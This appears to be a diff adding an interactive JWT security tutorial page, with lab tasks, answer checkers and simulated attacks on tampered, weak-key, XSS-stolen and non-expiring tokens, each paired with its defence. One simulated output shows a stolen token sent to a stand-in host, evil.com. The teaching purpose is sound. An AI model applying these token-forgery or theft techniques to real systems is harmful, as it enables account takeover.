+    <div class="section-tag">// section 10</div>
+    <div class="section-title">Hands-On Lab</div>
+    <div class="section-subtitle">Decode, modify, attack — understand what happens and why</div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-task">TASK 1: Decode the token — what is the user's role?</div>
+    <div class="terminal" style="font-size:11px">
+      <span class="comment">// target token (paste it in a JWT decoder or decode it mentally):</span><br>
+      <span style="color:#79c0ff;word-break:break-all">eyJ1c2VyX2lkIjo5OSwicm9sZSI6InVzZXIiLCJleHAiOjE3MTYyMzkwMjJ9</span><br>
+      <span class="comment">// hint: this is the payload section (middle part)</span>
+    </div>
+    <input class="lab-input" id="lab1" placeholder="What is the role in this payload? Type your answer..." />
+    <button class="sim-btn" onclick="checkLab1()">Check Answer</button>
+    <div class="sim-output" id="lab1-out"><span style="color:#484f58">Enter your answer above...</span></div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-task">TASK 2: Privilege escalation — what happens if you change the role?</div>
+    <div class="cb-body" style="font-size:12px;margin-bottom:12px">The original payload is: <span style="font-family:var(--font-mono);color:#79c0ff">{"user_id": 99, "role": "user"}</span><br>An attacker changes it to: <span style="font-family:var(--font-mono);color:#f85149">{"user_id": 99, "role": "admin"}</span></div>
+    <input class="lab-input" id="lab2" placeholder='What happens when the server verifies this modified token? (accepted/rejected)' />
+    <button class="sim-btn" onclick="checkLab2()">Check + Simulate</button>
+    <div class="sim-output" id="lab2-out"><span style="color:#484f58">Enter your answer and simulate...</span></div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-task">TASK 3: Why does the attack fail?</div>
+    <div class="cb-body" style="font-size:12px;margin-bottom:12px">Even though the attacker successfully modified the payload, the server rejected the token. Explain why in your own words.</div>
+    <input class="lab-input" id="lab3" placeholder='Why did the server reject the modified token? (hint: think about the signature...)' />
+    <button class="sim-btn" onclick="checkLab3()">Check Answer</button>
+    <div class="sim-output" id="lab3-out"><span style="color:#484f58">Enter your explanation...</span></div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-task">TASK 4: Scenario — when would the attack SUCCEED?</div>
+    <div class="cb-body" style="font-size:12px;margin-bottom:12px">Under what condition could an attacker successfully forge a JWT token and gain admin access?</div>
+    <input class="lab-input" id="lab4" placeholder='Name one condition that would let an attacker forge a valid JWT...' />
+    <button class="sim-btn" onclick="checkLab4()">Check Answer</button>
+    <div class="sim-output" id="lab4-out"><span style="color:#484f58">Enter your answer...</span></div>
+  </div>
+
+  <div id="lab-complete" style="display:none" class="concept-box success">
+    <div class="cb-title green">lab complete</div>
+    <div class="cb-body">You've successfully decoded tokens, understood privilege escalation, traced the signature verification mechanism, and identified when attacks succeed. You now understand JWT authentication at a practical level.</div>
+  </div>
+</div>
+
+<div class="nav-footer">
+  <button onclick="prevSection()">← Previous</button>
+  <div style="font-size:11px;color:#484f58;font-family:var(--font-mono);align-self:center" id="section-indicator">section 1 of 10</div>
+  <button onclick="nextSection()">Next →</button>
+</div>
+
+</div>
+
+<script>
+let current = 0;
+let flowStep = 0;
+let users = 0;
+let labDone = [false,false,false,false];
+
+const sections = document.querySelectorAll('.section');
+const navBtns = document.querySelectorAll('.nav-btn');
+
+function goto(n){
+  sections[current].classList.remove('active');
+  navBtns[current].classList.remove('active');
+  current = n;
+  sections[current].classList.add('active');
+  navBtns[current].classList.add('active');
+  document.getElementById('progress').style.width = ((n+1)/10*100)+'%';
+  document.getElementById('section-indicator').textContent = 'section '+(n+1)+' of 10';
+  if(n===7) buildCompare();
+}
+function nextSection(){if(current<9)goto(current+1);}
+function prevSection(){if(current>0)goto(current-1);}
+
+function addUser(){
+  if(users>=16){document.getElementById('mem-output').innerHTML='<span class="warn">Memory critical! Server running out of RAM. Add more users to crash...</span>';return;}
+  users++;
+  const grid=document.getElementById('mem-display');
+  const slot=document.createElement('div');
+  slot.className='mem-slot used';
+  slot.textContent='user'+users;
+  slot.id='slot'+users;
+  grid.appendChild(slot);
+  document.getElementById('mem-output').innerHTML='<span class="success">Session created for user'+users+'. Server RAM: '+users+'/16 slots used.</span><br><span style="color:#484f58">Total sessions in memory: '+users+'</span>';
+}
+
+function serverRestart(){
+  const slots=document.querySelectorAll('.mem-slot.used');
+  slots.forEach(s=>{s.className='mem-slot empty';s.textContent='---';});
+  users=0;
+  document.getElementById('mem-output').innerHTML='<span class="error">SERVER RESTARTED — RAM wiped.</span><br><span class="error">All '+slots.length+' sessions destroyed.</span><br><span class="warn">Every logged-in user is now logged out.</span>';
+}
+
+const flowSteps=[
+  {label:'user → server','msg':'<span class="warn">Step 1:</span> User submits login form with username and password.\n<span style="color:#484f58">POST /login { username: "alice", password: "pass123" }</span>'},
+  {label:'server verifies credentials','msg':'<span class="warn">Step 2:</span> Server checks database: does alice exist? Is the password correct?\n<span style="color:#484f58">SELECT * FROM users WHERE username = "alice" AND password_hash = hash("pass123")</span>'},
+  {label:'server creates JWT','msg':'<span class="success">Step 3:</span> Credentials valid! Server creates a JWT:\n<span style="color:#484f58">header.payload.HMAC(header+payload, SECRET_KEY)</span>'},
+  {label:'JWT sent to client','msg':'<span class="success">Step 4:</span> Server sends the signed JWT back in the response.\n<span style="color:#484f58">HTTP 200 OK\nSet-Cookie: token=eyJ... (or body JSON)</span>'},
+  {label:'client stores token','msg':'<span class="warn">Step 5:</span> Client saves the JWT locally.\n<span style="color:#484f58">localStorage.setItem("jwt", token) — or httpOnly cookie (safer)</span>'},
+  {label:'client sends token in request','msg':'<span class="warn">Step 6:</span> Client includes JWT in every request to protected routes.\n<span style="color:#484f58">GET /api/profile\nAuthorization: Bearer eyJ...</span>'},
+  {label:'server verifies signature','msg':'<span class="success">Step 7:</span> Server recalculates signature, checks if it matches.\n<span style="color:#484f58">expected = HMAC(header+payload, SECRET_KEY)\nassert signature == expected → valid!</span>'},
+  {label:'access granted — no DB lookup','msg':'<span class="success">Step 8:</span> Signature valid! Server reads user info directly from payload.\n<span style="color:#484f58">user = decode(payload)  # { user_id: 42, role: "user" }\nreturn profile_data  # no database query needed!</span>'},
+];
+
+function nextFlowStep(){
+  if(flowStep>=flowSteps.length){document.getElementById('flow-output').innerHTML='<span class="success">Flow complete! JWT authentication cycle finished.</span>';return;}
+  const step=flowStep;
+  const el=document.getElementById('step-display');
+  const div=document.createElement('div');
+  div.className='flow';
+  div.innerHTML='<div class="flow-node active-node">step '+(step+1)+'</div><div class="flow-arrow">→</div><div class="flow-node">'+flowSteps[step].label+'</div>';
+  el.appendChild(div);
+  document.getElementById('flow-output').innerHTML=flowSteps[step].msg.replace(/\n/g,'<br>');
+  flowStep++;
+}
+function resetFlow(){flowStep=0;document.getElementById('step-display').innerHTML='';document.getElementById('flow-output').innerHTML='<span style="color:#484f58">Click "Next Step" to begin the JWT flow...</span>';}
+
+function showPart(p){
+  document.querySelectorAll('.jwt-detail').forEach(d=>d.classList.remove('show'));
+  const map={header:'d-header',payload:'d-payload',sig:'d-sig'};
+  document.getElementById(map[p]).classList.add('show');
+}
+
+function sendRequest(type){
+  const out=document.getElementById('req-output');
+  if(type==='valid')out.innerHTML='<span class="success">→ 200 OK — Access Granted</span><br><span style="color:#484f58">Signature valid. Token not expired.</span><br><span style="color:#484f58">User: { user_id: 42, role: "user" } — loading profile...</span>';
+  else if(type==='modified')out.innerHTML='<span class="error">→ 401 Unauthorized — Invalid Signature</span><br><span style="color:#484f58">Token payload was modified. Signature mismatch detected.</span><br><span style="color:#484f58">Expected: SflKxwRJSM... Got: different hash. Request rejected.</span>';
+  else if(type==='expired')out.innerHTML='<span class="error">→ 401 Unauthorized — Token Expired</span><br><span style="color:#484f58">exp: 1716239022 (past). Current time is later. Token is no longer valid.</span><br><span style="color:#484f58">Client should request a new token using refresh token.</span>';
+  else out.innerHTML='<span class="error">→ 401 Unauthorized — No Token</span><br><span style="color:#484f58">Missing Authorization header. Protected route requires a valid Bearer token.</span>';
+}
+
+function simAttack(type, defended){
+  const ids={tamper:'atk1-output',brute:'atk2-output',xss:'atk3-output',noexp:'atk4-output'};
+  const out=document.getElementById(ids[type]);
+  if(type==='tamper'){
+    if(!defended)out.innerHTML='<span class="error">ATTACK SUCCESS — Admin access granted!</span><br><span class="error">Server trusted payload without checking signature.</span><br><span class="warn">Attacker is now admin. All admin endpoints accessible.</span><br><span style="color:#484f58">Root cause: server skipped signature verification.</span>';
+    else out.innerHTML='<span class="success">ATTACK BLOCKED — 401 Unauthorized</span><br><span class="success">Server recomputed signature and found a mismatch.</span><br><span style="color:#484f58">Payload was modified but attacker does not know the secret key.</span><br><span style="color:#484f58">Modified payload produces a completely different hash.</span>';
+  }
+  else if(type==='brute'){
+    if(!defended)out.innerHTML='<span class="error">SECRET FOUND — "secret123"</span><br><span class="error">Attacker can now sign arbitrary payloads with this key.</span><br><span class="warn">Attacker forges: { user_id: 1, role: "admin" } — signs it — accepted!</span><br><span style="color:#484f58">Root cause: weak, guessable secret key.</span>';
+    else out.innerHTML='<span class="success">Brute force failed after 10M+ attempts.</span><br><span class="success">Strong key (256-bit random) is computationally infeasible to guess.</span><br><span style="color:#484f58">Good: key is a random hex string, not a word or phrase.</span>';
+  }
+  else if(type==='xss'){
+    if(!defended)out.innerHTML='<span class="error">TOKEN STOLEN via XSS</span><br><span class="error">Script accessed localStorage.getItem("jwt")</span><br><span class="error">Sent to attacker server: evil.com?t=eyJ...</span><br><span class="warn">Attacker replays token and impersonates user until token expires.</span>';
+    else out.innerHTML='<span class="success">XSS attempt failed — token not accessible to JavaScript</span><br><span class="success">httpOnly cookie cannot be read by document.cookie or localStorage.</span><br><span style="color:#484f58">Even with XSS injection, scripts cannot access httpOnly cookies.</span>';
+  }
+  else if(type==='noexp'){
+    if(!defended)out.innerHTML='<span class="error">ETERNAL TOKEN — attack succeeds indefinitely</span><br><span class="error">Token has no "exp" claim. It never expires.</span><br><span class="warn">Stolen 3 months ago → still works. User changed password → still works.</span><br><span style="color:#484f58">Only option: rotate secret key and invalidate ALL tokens.</span>';
+    else out.innerHTML='<span class="success">Token expired — 401 Unauthorized</span><br><span class="success">exp claim: 15 minutes after issue. Token is now invalid.</span><br><span style="color:#484f58">Even if stolen, attacker had at most 15 minutes of access.</span><br><span style="color:#484f58">Best practice: short-lived tokens + refresh token flow.</span>';
+  }
+}
+
+const compareData=[
+  ['Where data lives','Server memory / database','Inside the token (client-side)'],
+  ['Stateful / Stateless','Stateful — server must track state','Stateless — server needs no memory'],
+  ['Storage on client','Session ID in cookie','Full token in cookie or localStorage'],
+  ['Sent via','Cookie header (automatic)','Authorization header (manual)'],
+  ['Server restart','All sessions lost','No impact — tokens still valid'],
+  ['Scaling (multiple servers)','Hard — need shared session store','Easy — any server can verify'],
+  ['Revocation','Easy — delete session from DB','Hard — tokens valid until expiry'],
+  ['Token size','Small (just an ID)','Larger (contains data)'],
+];
+
+function buildCompare(){
+  const container=document.getElementById('compare-rows');
+  if(container.children.length>0)return;
+  compareData.forEach(([label,session,jwt])=>{
+    container.innerHTML+=`<div style="margin-bottom:8px"><div style="font-size:10px;color:#484f58;font-family:var(--font-mono);margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px">${label}</div><div class="compare-row"><div class="compare-cell"><div class="compare-val" style="font-size:12px">${session}</div></div><div class="compare-cell" style="border-color:#58a6ff33"><div class="compare-val" style="font-size:12px;color:#79c0ff">${jwt}</div></div></div></div>`;
+  });
+}
+
+function checkLab1(){
+  const val=document.getElementById('lab1').value.toLowerCase().trim();
+  const out=document.getElementById('lab1-out');
+  if(val.includes('user')||val.includes('"user"')){
+    out.innerHTML='<span class="success">Correct! The decoded payload is:</span><br><span style="color:#484f58">{"user_id":99,"role":"user","exp":1716239022}</span><br><span class="success">Role is "user" — not admin. The base64 decode reveals the plaintext JSON.</span>';
+    labDone[0]=true;checkComplete();
+  }else{
+    out.innerHTML='<span class="warn">Not quite. Try decoding: eyJ1c2VyX2lkIjo5OSwicm9sZSI6InVzZXIiLCJleHAiOjE3MTYyMzkwMjJ9</span><br><span style="color:#484f58">Hint: base64 decode this string. The role is a common word for a regular user.</span>';
+  }
+}
+function checkLab2(){
+  const val=document.getElementById('lab2').value.toLowerCase().trim();
+  const out=document.getElementById('lab2-out');
+  if(val.includes('reject')||val.includes('denied')||val.includes('fail')||val.includes('401')||val.includes('invalid')){
+    out.innerHTML='<span class="success">Correct! The modified token is rejected.</span><br><span class="error">Simulating: HMAC(modified_payload, SECRET_KEY) → different signature</span><br><span class="error">Server expected: old_sig | Got: new_sig → MISMATCH → 401 Unauthorized</span><br><span style="color:#484f58">The server detects that the payload was changed.</span>';
+    labDone[1]=true;checkComplete();
+  }else{
+    out.innerHTML='<span class="warn">Think about what the server checks when it receives a modified token...</span><br><span style="color:#484f58">Does the server trust the modified payload, or does it verify something first?</span>';
+  }
+}
+function checkLab3(){
+  const val=document.getElementById('lab3').value.toLowerCase().trim();
+  const out=document.getElementById('lab3-out');
+  if(val.includes('sign')||val.includes('secret')||val.includes('hmac')||val.includes('hash')||val.includes('key')){
+    out.innerHTML='<span class="success">Excellent! Correct explanation.</span><br><span style="color:#484f58">The attacker changed the payload, but does not know the server\'s secret key.</span><br><span style="color:#484f58">So they cannot recalculate a valid signature for the modified payload.</span><br><span style="color:#484f58">The signature in the token no longer matches the new payload → rejected.</span>';
+    labDone[2]=true;checkComplete();
+  }else{
+    out.innerHTML='<span class="warn">Think about what protects the payload from modification...</span><br><span style="color:#484f58">If you change the payload, what needs to change too? What does the attacker not have?</span>';
+  }
+}
+function checkLab4(){
+  const val=document.getElementById('lab4').value.toLowerCase().trim();
+  const out=document.getElementById('lab4-out');
+  if(val.includes('secret')||val.includes('key')||val.includes('weak')||val.includes('knows')||val.includes('leak')||val.includes('brute')||val.includes('no sig')||val.includes('skip')||val.includes('alg:none')||val.includes('alg none')){
+    out.innerHTML='<span class="success">Great answer! The attack succeeds if:</span><br><span class="error">→ The attacker knows or guesses the secret key (can forge valid signature)</span><br><span class="error">→ The server skips signature verification (trusts payload blindly)</span><br><span class="error">→ The server accepts "alg: none" (algorithm confusion attack)</span><br><span style="color:#484f58">All three are real vulnerabilities found in production systems.</span>';
+    labDone[3]=true;checkComplete();
+  }else{
+    out.innerHTML='<span class="warn">Think about the three conditions that protect JWT...</span><br><span style="color:#484f58">What if the server never checks the signature? What if the attacker has the key?</span>';
+  }
+}
+function checkComplete(){
+  if(labDone.every(Boolean))document.getElementById('lab-complete').style.display='block';
+}
+</script>
